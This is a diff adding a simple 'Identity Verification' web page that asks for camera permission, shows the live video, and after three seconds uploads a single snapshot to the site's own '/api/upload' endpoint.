@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Identity Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    video {
+      margin-top: 20px;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 8px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+
+  <h2>📸 Identity Verification</h2>
+  <p>Please allow camera access to verify your identity.</p>
+
+  <video id="video" autoplay playsinline></video>
+
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Take snapshot after 3 seconds
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/png');
+
+          // Send snapshot to your API endpoint
+          fetch('/api/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData })
+          })
+          .then(res => res.text())
+          .then(response => {
+            alert('✅ Snapshot captured & sent successfully!');
+          })
+          .catch(err => {
+            console.error('❌ Error uploading image:', err);
+          });
+
+        }, 3000);
+      })
+      .catch(err => {
+        alert('❌ Camera access denied!');
+        console.error(err);
+      });
+  </script>
+
+</body>
+</html>
